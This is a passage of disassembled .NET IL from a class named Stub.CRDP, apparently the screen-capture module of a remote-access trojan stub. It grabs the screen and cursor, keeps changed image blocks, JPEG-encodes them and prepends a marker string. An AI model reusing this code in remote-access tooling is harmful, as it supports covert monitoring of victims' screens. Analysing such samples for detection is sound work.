      IL_0546:  ldc.i4.0
      IL_0547:  ldloc.s    V_20
      IL_0549:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32)
      IL_054e:  nop
      IL_054f:  ldloc.s    V_20
      IL_0551:  ldloc.s    V_8
      IL_0553:  ldloc.s    V_11
      IL_0555:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
      IL_055a:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_055f:  add.ovf
      IL_0560:  stloc.s    V_20
      IL_0562:  nop
      IL_0563:  ldloca.s   V_43
      IL_0565:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32>::MoveNext()
      IL_056a:  stloc.s    V_44
      IL_056c:  ldloc.s    V_44
      IL_056e:  brtrue     IL_04ad

      IL_0573:  nop
      IL_0574:  leave.s    IL_0585

    }  // end .try
    finally
    {
      IL_0576:  ldloca.s   V_43
      IL_0578:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<int32>
      IL_057e:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0583:  nop
      IL_0584:  endfinally
    }  // end handler
    IL_0585:  ldloc.s    V_16
    IL_0587:  ldstr      "njq8"
    IL_058c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0591:  stloc.s    V_16
    IL_0593:  ldloc.s    V_8
    IL_0595:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Count()
    IL_059a:  ldc.i4.1
    IL_059b:  sub.ovf
    IL_059c:  stloc.s    V_13
    IL_059e:  ldc.i4.0
    IL_059f:  stloc.s    V_7
    IL_05a1:  br.s       IL_05e5

    IL_05a3:  ldloc.s    V_10
    IL_05a5:  ldloc.s    V_7
    IL_05a7:  callvirt   instance bool class [mscorlib]System.Collections.Generic.List`1<int32>::Contains(!0)
    IL_05ac:  ldc.i4.0
    IL_05ad:  ceq
    IL_05af:  stloc.s    V_44
    IL_05b1:  ldloc.s    V_44
    IL_05b3:  brfalse.s  IL_05dd

    IL_05b5:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP::OA
    IL_05ba:  ldloc.s    V_8
    IL_05bc:  ldloc.s    V_7
    IL_05be:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::get_Item(int32)
    IL_05c3:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::Add(!0)
    IL_05c8:  nop
    IL_05c9:  ldsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP::OAA
    IL_05ce:  ldloc.s    V_9
    IL_05d0:  ldloc.s    V_7
    IL_05d2:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::get_Item(int32)
    IL_05d7:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::Add(!0)
    IL_05dc:  nop
    IL_05dd:  nop
    IL_05de:  ldloc.s    V_7
    IL_05e0:  ldc.i4.1
    IL_05e1:  add.ovf
    IL_05e2:  stloc.s    V_7
    IL_05e4:  nop
    IL_05e5:  ldloc.s    V_7
    IL_05e7:  ldloc.s    V_13
    IL_05e9:  cgt
    IL_05eb:  ldc.i4.0
    IL_05ec:  ceq
    IL_05ee:  stloc.s    V_44
    IL_05f0:  ldloc.s    V_44
    IL_05f2:  brtrue.s   IL_05a3

    IL_05f4:  ldloc.3
    IL_05f5:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
    IL_05fa:  nop
    IL_05fb:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0600:  stloc.s    V_19
    IL_0602:  ldc.i4.1
    IL_0603:  newobj     instance void [System.Drawing]System.Drawing.Imaging.EncoderParameters::.ctor(int32)
    IL_0608:  stloc.2
    IL_0609:  ldloc.2
    IL_060a:  callvirt   instance class [System.Drawing]System.Drawing.Imaging.EncoderParameter[] [System.Drawing]System.Drawing.Imaging.EncoderParameters::get_Param()
    IL_060f:  ldc.i4.0
    IL_0610:  ldsfld     class [System.Drawing]System.Drawing.Imaging.Encoder [System.Drawing]System.Drawing.Imaging.Encoder::Quality
    IL_0615:  ldarg.2
    IL_0616:  conv.i8
    IL_0617:  newobj     instance void [System.Drawing]System.Drawing.Imaging.EncoderParameter::.ctor(class [System.Drawing]System.Drawing.Imaging.Encoder,
                                                                                                      int64)
    IL_061c:  stelem.ref
    IL_061d:  nop
    IL_061e:  ldstr      "image/jpeg"
    IL_0623:  call       class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo Stub.CRDP::GetEncoderInfo(string)
    IL_0628:  stloc.1
    IL_0629:  ldloc.s    V_6
    IL_062b:  ldloc.s    V_19
    IL_062d:  ldloc.1
    IL_062e:  ldloc.2
    IL_062f:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                  class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo,
                                                                                  class [System.Drawing]System.Drawing.Imaging.EncoderParameters)
    IL_0634:  nop
    IL_0635:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_063a:  stloc.s    V_18
    IL_063c:  ldloc.s    V_18
    IL_063e:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0643:  ldloc.s    V_16
    IL_0645:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_064a:  ldc.i4.0
    IL_064b:  ldloc.s    V_16
    IL_064d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0652:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0657:  nop
    IL_0658:  ldloc.s    V_18
    IL_065a:  ldloc.s    V_19
    IL_065c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0661:  ldc.i4.0
    IL_0662:  ldloc.s    V_19
    IL_0664:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_0669:  conv.ovf.i4
    IL_066a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_066f:  nop
    IL_0670:  ldloc.s    V_14
    IL_0672:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_0677:  ldloc.s    V_6
    IL_0679:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
    IL_067e:  nop
    IL_067f:  ldloc.s    V_18
    IL_0681:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0686:  stloc.0
    IL_0687:  br.s       IL_0689

    IL_0689:  ldloc.0
    IL_068a:  ret
  } // end of method CRDP::Cap

  .method public static void  Clear() cil managed
  {
    // Code size       33 (0x21)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.i4.m1
    IL_0002:  stsfld     int32 Stub.CRDP::oQ
    IL_0007:  ldc.i4.m1
    IL_0008:  stsfld     int32 Stub.CRDP::oCo
    IL_000d:  ldc.i4.m1
    IL_000e:  stsfld     int32 Stub.CRDP::oQu
    IL_0013:  ldc.i4.1
    IL_0014:  ldc.i4.1
    IL_0015:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_001a:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_001f:  nop
    IL_0020:  ret
  } // end of method CRDP::Clear

  .method private static class [System.Drawing]System.Drawing.Image 
          Gd([opt] int32 Wi,
             [opt] int32 He,
             [opt] bool Sh) cil managed
  {
    .param [1] = int32(0x00000000)
    .param [2] = int32(0x00000000)
    .param [3] = bool(true)
    // Code size       262 (0x106)
    .maxstack  7
    .locals init (valuetype [System.Drawing]System.Drawing.Size V_0,
             valuetype [System.Drawing]System.Drawing.Rectangle V_1,
             class [System.Drawing]System.Drawing.Graphics V_2,
             class [System.Drawing]System.Drawing.Image V_3,
             int32 V_4,
             class [System.Drawing]System.Drawing.Bitmap V_5,
             native int V_6,
             int32 V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             valuetype [System.Drawing]System.Drawing.Rectangle V_10,
             bool V_11)
    IL_0000:  nop
    IL_0001:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0006:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_000b:  stloc.s    V_10
    IL_000d:  ldloca.s   V_10
    IL_000f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0014:  stloc.s    V_7
    IL_0016:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_001b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_0020:  stloc.s    V_10
    IL_0022:  ldloca.s   V_10
    IL_0024:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0029:  stloc.s    V_4
    IL_002b:  ldloc.s    V_7
    IL_002d:  ldloc.s    V_4
    IL_002f:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_0034:  stloc.s    V_5
    IL_0036:  ldloc.s    V_5
    IL_0038:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
    IL_003d:  stloc.2
    IL_003e:  ldloc.2
    IL_003f:  ldc.i4.1
    IL_0040:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::set_CompositingQuality(valuetype [System.Drawing]System.Drawing.Drawing2D.CompositingQuality)
    IL_0045:  nop
    IL_0046:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_004b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_0050:  stloc.1
    IL_0051:  ldloca.s   V_0
    IL_0053:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0058:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_005d:  stloc.s    V_10
    IL_005f:  ldloca.s   V_10
    IL_0061:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0066:  ldloca.s   V_1
    IL_0068:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_006d:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_0072:  nop
    IL_0073:  ldloc.2
    IL_0074:  ldc.i4.0
    IL_0075:  ldc.i4.0
    IL_0076:  ldc.i4.0
    IL_0077:  ldc.i4.0
    IL_0078:  ldloc.0
    IL_0079:  ldc.i4     0xcc0020
    IL_007e:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                               int32,
                                                                                               int32,
                                                                                               int32,
                                                                                               valuetype [System.Drawing]System.Drawing.Size,
                                                                                               valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
    IL_0083:  nop
    IL_0084:  ldarg.2
    IL_0085:  stloc.s    V_11
    IL_0087:  ldloc.s    V_11
    IL_0089:  brfalse.s  IL_00d8

    IL_008b:  nop
    .try
    {
      IL_008c:  ldloca.s   V_0
      IL_008e:  ldc.i4.s   32
      IL_0090:  ldc.i4.s   32
      IL_0092:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_0097:  nop
      IL_0098:  ldloca.s   V_1
      IL_009a:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
      IL_009f:  ldloc.0
      IL_00a0:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                         valuetype [System.Drawing]System.Drawing.Size)
      IL_00a5:  nop
      IL_00a6:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
      IL_00ab:  ldloc.2
      IL_00ac:  ldloc.1
      IL_00ad:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                 valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_00b2:  nop
      IL_00b3:  leave.s    IL_00d7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_9
      IL_00bd:  nop
      IL_00be:  ldloc.s    V_9
      IL_00c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c5:  nop
      IL_00c6:  ldloc.s    V_9
      IL_00c8:  stloc.s    V_8
      IL_00ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cf:  nop
      IL_00d0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d5:  leave.s    IL_00d7

    }  // end handler
    IL_00d7:  nop
    IL_00d8:  nop
    IL_00d9:  ldloc.2
    IL_00da:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
    IL_00df:  nop
    IL_00e0:  ldarg.0
    IL_00e1:  ldc.i4.0
    IL_00e2:  ceq
    IL_00e4:  ldarg.1
    IL_00e5:  ldc.i4.0
    IL_00e6:  ceq
    IL_00e8:  and
    IL_00e9:  stloc.s    V_11
    IL_00eb:  ldloc.s    V_11
    IL_00ed:  brfalse.s  IL_00f4

    IL_00ef:  ldloc.s    V_5
    IL_00f1:  stloc.3
    IL_00f2:  br.s       IL_0104

    IL_00f4:  nop
    IL_00f5:  ldloc.s    V_5
    IL_00f7:  ldarg.0
    IL_00f8:  ldarg.1
    IL_00f9:  ldnull
    IL_00fa:  ldloc.s    V_6
    IL_00fc:  callvirt   instance class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::GetThumbnailImage(int32,
                                                                                                                                     int32,
                                                                                                                                     class [System.Drawing]System.Drawing.Image/GetThumbnailImageAbort,
                                                                                                                                     native int)
    IL_0101:  stloc.3
    IL_0102:  br.s       IL_0104

    IL_0104:  ldloc.3
    IL_0105:  ret
  } // end of method CRDP::Gd

  .method private static class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo 
          GetEncoderInfo(string M) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo V_0,
             int32 V_1,
             class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo[] V_2,
             int32 V_3,
             bool V_4)
    IL_0000:  nop
    IL_0001:  call       class [System.Drawing]System.Drawing.Imaging.ImageCodecInfo[] [System.Drawing]System.Drawing.Imaging.ImageCodecInfo::GetImageEncoders()
    IL_0006:  stloc.2
    IL_0007:  ldloc.2
    IL_0008:  ldlen
    IL_0009:  conv.ovf.i4
    IL_000a:  stloc.3
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.1
    IL_000d:  br.s       IL_0033

    IL_000f:  ldloc.2
    IL_0010:  ldloc.1
    IL_0011:  ldelem.ref
    IL_0012:  callvirt   instance string [System.Drawing]System.Drawing.Imaging.ImageCodecInfo::get_MimeType()
    IL_0017:  ldarg.0
    IL_0018:  ldc.i4.0
    IL_0019:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001e:  ldc.i4.0
    IL_001f:  ceq
    IL_0021:  stloc.s    V_4
    IL_0023:  ldloc.s    V_4
    IL_0025:  brfalse.s  IL_002d

    IL_0027:  ldloc.2
    IL_0028:  ldloc.1
    IL_0029:  ldelem.ref
    IL_002a:  stloc.0
    IL_002b:  br.s       IL_0044

    IL_002d:  nop
    IL_002e:  ldloc.1
    IL_002f:  ldc.i4.1
    IL_0030:  add.ovf
    IL_0031:  stloc.1
    IL_0032:  nop
    IL_0033:  ldloc.1
    IL_0034:  ldloc.3
    IL_0035:  cgt
    IL_0037:  ldc.i4.0
    IL_0038:  ceq
    IL_003a:  stloc.s    V_4
    IL_003c:  ldloc.s    V_4
    IL_003e:  brtrue.s   IL_000f

    IL_0040:  ldnull
    IL_0041:  stloc.0
    IL_0042:  br.s       IL_0044

    IL_0044:  ldloc.0
    IL_0045:  ret
  } // end of method CRDP::GetEncoderInfo

  .method private static string  md5(uint8[] bB) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000c:  starg.s    bB
    IL_000e:  ldarg.0
    IL_000f:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_0014:  stloc.0
    IL_0015:  br.s       IL_0017

    IL_0017:  ldloc.0
    IL_0018:  ret
  } // end of method CRDP::md5

  .method private static valuetype [System.Drawing]System.Drawing.Size 
          QZ(int32 q) cil managed
  {
    // Code size       1405 (0x57d)
    .maxstack  5
    .locals init (valuetype [System.Drawing]System.Drawing.Size V_0,
             valuetype [System.Drawing]System.Drawing.Size V_1,
             valuetype [System.Drawing]System.Drawing.Rectangle V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             int32 V_4,
             int32 V_5,
             int32 V_6,
             int32 V_7)
    IL_0000:  nop
    IL_0001:  ldloca.s   V_1
    IL_0003:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_0008:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_000d:  stloc.2
    IL_000e:  ldloca.s   V_2
    IL_0010:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
    IL_0015:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_001a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_001f:  stloc.3
    IL_0020:  ldloca.s   V_3
    IL_0022:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0027:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                  int32)
    IL_002c:  nop
    IL_002d:  nop
    IL_002e:  ldarg.0
    IL_002f:  stloc.s    V_7
    IL_0031:  ldloc.s    V_7
    IL_0033:  switch     ( 
                          IL_0075,
                          IL_0082,
                          IL_00da,
                          IL_0132,
                          IL_018a,
                          IL_01e2,
                          IL_023a,
                          IL_0292,
                          IL_02ea,
                          IL_0342,
                          IL_039a,
                          IL_03f2,
                          IL_044a,
                          IL_049c)
    IL_0070:  br         IL_04ec

    IL_0075:  nop
    IL_0076:  ldloc.1
    IL_0077:  stloc.0
    IL_0078:  br         IL_057b

    IL_007d:  br         IL_04ec

    IL_0082:  nop
    IL_0083:  ldloca.s   V_1
    IL_0085:  ldloca.s   V_1
    IL_0087:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_008c:  conv.r8
    IL_008d:  ldc.r8     1.1000000000000001
    IL_0096:  div
    IL_0097:  conv.r8
    IL_0098:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_009d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00a2:  conv.ovf.i4
    IL_00a3:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_00a8:  nop
    IL_00a9:  ldloca.s   V_1
    IL_00ab:  ldloca.s   V_1
    IL_00ad:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_00b2:  conv.r8
    IL_00b3:  ldc.r8     1.1000000000000001
    IL_00bc:  div
    IL_00bd:  conv.r8
    IL_00be:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00c3:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00c8:  conv.ovf.i4
    IL_00c9:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_00ce:  nop
    IL_00cf:  nop
    IL_00d0:  br         IL_04ec

    IL_00d5:  br         IL_04ec

    IL_00da:  nop
    IL_00db:  ldloca.s   V_1
    IL_00dd:  ldloca.s   V_1
    IL_00df:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_00e4:  conv.r8
    IL_00e5:  ldc.r8     1.3
    IL_00ee:  div
    IL_00ef:  conv.r8
    IL_00f0:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00f5:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_00fa:  conv.ovf.i4
    IL_00fb:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0100:  nop
    IL_0101:  ldloca.s   V_1
    IL_0103:  ldloca.s   V_1
    IL_0105:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_010a:  conv.r8
    IL_010b:  ldc.r8     1.3
    IL_0114:  div
    IL_0115:  conv.r8
    IL_0116:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_011b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0120:  conv.ovf.i4
    IL_0121:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0126:  nop
    IL_0127:  nop
    IL_0128:  br         IL_04ec

    IL_012d:  br         IL_04ec

    IL_0132:  nop
    IL_0133:  ldloca.s   V_1
    IL_0135:  ldloca.s   V_1
    IL_0137:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_013c:  conv.r8
    IL_013d:  ldc.r8     1.5
    IL_0146:  div
    IL_0147:  conv.r8
    IL_0148:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_014d:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0152:  conv.ovf.i4
    IL_0153:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0158:  nop
    IL_0159:  ldloca.s   V_1
    IL_015b:  ldloca.s   V_1
    IL_015d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0162:  conv.r8
    IL_0163:  ldc.r8     1.5
    IL_016c:  div
    IL_016d:  conv.r8
    IL_016e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0173:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0178:  conv.ovf.i4
    IL_0179:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_017e:  nop
    IL_017f:  nop
    IL_0180:  br         IL_04ec

    IL_0185:  br         IL_04ec

    IL_018a:  nop
    IL_018b:  ldloca.s   V_1
    IL_018d:  ldloca.s   V_1
    IL_018f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0194:  conv.r8
    IL_0195:  ldc.r8     1.8999999999999999
    IL_019e:  div
    IL_019f:  conv.r8
    IL_01a0:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01a5:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01aa:  conv.ovf.i4
    IL_01ab:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_01b0:  nop
    IL_01b1:  ldloca.s   V_1
    IL_01b3:  ldloca.s   V_1
    IL_01b5:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_01ba:  conv.r8
    IL_01bb:  ldc.r8     1.8999999999999999
    IL_01c4:  div
    IL_01c5:  conv.r8
    IL_01c6:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01cb:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01d0:  conv.ovf.i4
    IL_01d1:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_01d6:  nop
    IL_01d7:  nop
    IL_01d8:  br         IL_04ec

    IL_01dd:  br         IL_04ec

    IL_01e2:  nop
    IL_01e3:  ldloca.s   V_1
    IL_01e5:  ldloca.s   V_1
    IL_01e7:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_01ec:  conv.r8
    IL_01ed:  ldc.r8     2.
    IL_01f6:  div
    IL_01f7:  conv.r8
    IL_01f8:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_01fd:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0202:  conv.ovf.i4
    IL_0203:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0208:  nop
    IL_0209:  ldloca.s   V_1
    IL_020b:  ldloca.s   V_1
    IL_020d:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_0212:  conv.r8
    IL_0213:  ldc.r8     2.
    IL_021c:  div
    IL_021d:  conv.r8
    IL_021e:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0223:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0228:  conv.ovf.i4
    IL_0229:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_022e:  nop
    IL_022f:  nop
    IL_0230:  br         IL_04ec

    IL_0235:  br         IL_04ec

    IL_023a:  nop
    IL_023b:  ldloca.s   V_1
    IL_023d:  ldloca.s   V_1
    IL_023f:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_0244:  conv.r8
    IL_0245:  ldc.r8     2.1000000000000001
    IL_024e:  div
    IL_024f:  conv.r8
    IL_0250:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0255:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_025a:  conv.ovf.i4
    IL_025b:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0260:  nop
    IL_0261:  ldloca.s   V_1
    IL_0263:  ldloca.s   V_1
    IL_0265:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_026a:  conv.r8
    IL_026b:  ldc.r8     2.1000000000000001
    IL_0274:  div
    IL_0275:  conv.r8
    IL_0276:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_027b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0280:  conv.ovf.i4
    IL_0281:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0286:  nop
    IL_0287:  nop
    IL_0288:  br         IL_04ec

    IL_028d:  br         IL_04ec

    IL_0292:  nop
    IL_0293:  ldloca.s   V_1
    IL_0295:  ldloca.s   V_1
    IL_0297:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_029c:  conv.r8
    IL_029d:  ldc.r8     2.2000000000000002
    IL_02a6:  div
    IL_02a7:  conv.r8
    IL_02a8:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02ad:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02b2:  conv.ovf.i4
    IL_02b3:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_02b8:  nop
    IL_02b9:  ldloca.s   V_1
    IL_02bb:  ldloca.s   V_1
    IL_02bd:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_02c2:  conv.r8
    IL_02c3:  ldc.r8     2.2000000000000002
    IL_02cc:  div
    IL_02cd:  conv.r8
    IL_02ce:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02d3:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_02d8:  conv.ovf.i4
    IL_02d9:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_02de:  nop
    IL_02df:  nop
    IL_02e0:  br         IL_04ec

    IL_02e5:  br         IL_04ec

    IL_02ea:  nop
    IL_02eb:  ldloca.s   V_1
    IL_02ed:  ldloca.s   V_1
    IL_02ef:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Width()
    IL_02f4:  conv.r8
    IL_02f5:  ldc.r8     2.5
    IL_02fe:  div
    IL_02ff:  conv.r8
    IL_0300:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0305:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_030a:  conv.ovf.i4
    IL_030b:  call       instance void [System.Drawing]System.Drawing.Size::set_Width(int32)
    IL_0310:  nop
    IL_0311:  ldloca.s   V_1
    IL_0313:  ldloca.s   V_1
    IL_0315:  call       instance int32 [System.Drawing]System.Drawing.Size::get_Height()
    IL_031a:  conv.r8
    IL_031b:  ldc.r8     2.5
    IL_0324:  div
    IL_0325:  conv.r8
    IL_0326:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_032b:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0330:  conv.ovf.i4
    IL_0331:  call       instance void [System.Drawing]System.Drawing.Size::set_Height(int32)
    IL_0336:  nop
    IL_0337:  nop
    IL_0338:  br         IL_04ec

